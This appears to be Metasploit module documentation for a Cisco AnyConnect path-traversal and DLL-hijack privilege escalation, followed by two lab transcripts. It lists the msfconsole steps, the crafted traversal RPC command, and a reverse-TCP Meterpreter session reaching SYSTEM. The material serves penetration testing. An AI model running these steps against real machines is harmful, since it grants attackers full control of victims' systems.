## Vulnerable Application

The installer component of Cisco AnyConnect Secure Mobility Client for Windows
prior to 4.8.02042 is vulnerable to path traversal and allows local attackers
to create/overwrite files in arbitrary locations with system level privileges.

The attack consists in sending a specially crafted RPC request to the TCP port
62522 on the loopback device, which is exposed by the Cisco AnyConnect Secure
Mobility Agent service. This service will then launch the vulnerable installer
component (`vpndownloader`), which copies itself to an arbitrary location
before being executed with system privileges. Since `vpndownloader` is also
vulnerable to DLL hijacking, a specially crafted DLL (`dbghelp.dll`) is created
at the same location `vpndownloader` will be copied to get code execution with
system privileges.

This exploit has been successfully tested against Cisco AnyConnect Secure
Mobility Client versions 4.5.04029, 4.5.05030 and 4.7.04056 on Windows 10
version 1909 (x64) and Windows 7 SP1 (x86).

Unfortunately, AnyConnect Secure Mobility Client is not publicly available.
Only customers with active contracts can download it.

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Get a session with non-administrative privileges
  4. Do: ```use exploit/windows/local/anyconnect_path_traversal_lpe```
  5. Do: ```set SESSION <SESSION>```
  6. Do: ```set payload windows/meterpreter/reverse_tcp```
  7. Do: ```set LHOST <LHOST>```
  8. Do: ```set LPORT <LPORT>```
  9. Do: ```check```
  10. Do: ```run```
  11. You should get a new session with system privileges

## Options
### ForceExploit

  Set this to `true` to override the `check` result during exploitation.

## Scenarios

### Windows 10 version 1909 (x64) with AnyConnect 4.7.4056

  ```
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > set SESSION 8
  SESSION => 8
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > set payload windows/meterpreter/reverse_tcp
  payload => windows/meterpreter/reverse_tcp
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > set LHOST 172.16.60.1
  LHOST => 172.16.60.1
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > set LPORT 4445
  LPORT => 4445
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > set verbose true
  verbose => true
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > check

  [*] Found vpndownloader.exe path: 'C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpndownloader.exe'
  [+] Cisco AnyConnect version 4.7.4056.0.0 appears to be vulnerable
  [*] The target appears to be vulnerable.
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > run

  [*] Started reverse TCP handler on 172.16.60.1:4445
  [*] Found vpndownloader.exe path: 'C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpndownloader.exe'
  [+] Cisco AnyConnect version 4.7.4056.0.0 appears to be vulnerable
  [*] "-ipc" argument needed
  [*] Writing the payload to C:\ProgramData\Cisco\dbghelp.dll
  [*] RPC Command: "CAC-nc-install	-ipc=1820	C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\nope\nope\nope\nope\../../../../vpndownloader.exe	-"
  [*] Connecting to the AnyConnect agent on 127.0.0.1:62522
  [*] Send the encoded RPC command (size = 269 bytes)
  [*] Sending stage (176195 bytes) to 172.16.60.202
  [*] Meterpreter session 9 opened (172.16.60.1:4445 -> 172.16.60.202:49765) at 2020-06-19 19:35:29 +0200
  [+] Deleted C:\ProgramData\Cisco\dbghelp.dll
  [+] Deleted C:\ProgramData\Cisco\vpndownloader.exe
  [*] Shutdown the socket

  meterpreter > getuid
  Server username: NT AUTHORITY\SYSTEM
  meterpreter > sysinfo
  Computer        : DESKTOP-UUQE0B4
  OS              : Windows 10 (10.0 Build 18363).
  Architecture    : x64
  System Language : en_US
  Domain          : WORKGROUP
  Logged On Users : 2
  Meterpreter     : x86/windows
  ```

### Windows 7 SP1 (x86) with AnyConnect 4.5.5030

  ```
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > set SESSION 8
  SESSION => 8
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > set payload windows/meterpreter/reverse_tcp
  payload => windows/meterpreter/reverse_tcp
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > set LHOST 172.16.60.1
  LHOST => 172.16.60.1
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > set LPORT 4445
  LPORT => 4445
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > set verbose true
  verbose => true
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > check

  [*] Found vpndownloader.exe path: 'C:\Program Files\Cisco\Cisco AnyConnect Secure Mobility Client\vpndownloader.exe'
  [+] Cisco AnyConnect version 4.5.5030.0.0 appears to be vulnerable
  [*] The target appears to be vulnerable.
  msf5 exploit(windows/local/anyconnect_path_traversal_lpe) > run

  [*] Started reverse TCP handler on 172.16.60.1:4445
  [*] Found vpndownloader.exe path: 'C:\Program Files\Cisco\Cisco AnyConnect Secure Mobility Client\vpndownloader.exe'
  [+] Cisco AnyConnect version 4.5.5030.0.0 appears to be vulnerable
  [*] "-ipc" argument not needed
  [*] Writing the payload to C:\ProgramData\Cisco\dbghelp.dll
  [*] RPC Command: "CAC-nc-install	C:\Program Files\Cisco\Cisco AnyConnect Secure Mobility Client\nope\nope\nope\nope\../../../../vpndownloader.exe	-"
  [*] Connecting to the AnyConnect agent on 127.0.0.1:62522
  [*] Send the encoded RPC command (size = 247 bytes)
  [*] Sending stage (176195 bytes) to 172.16.60.134
  [*] Meterpreter session 10 opened (172.16.60.1:4445 -> 172.16.60.134:49218) at 2020-06-19 19:41:53 +0200
  [+] Deleted C:\ProgramData\Cisco\dbghelp.dll
  [+] Deleted C:\ProgramData\Cisco\vpndownloader.exe
  [*] Shutdown the socket

  meterpreter > getuid
  Server username: NT AUTHORITY\SYSTEM
  meterpreter > sysinfo
  Computer        : WIN7-DEV
  OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
  Architecture    : x86
  System Language : en_US
  Domain          : WORKGROUP
  Logged On Users : 2
  Meterpreter     : x86/windows
  ```
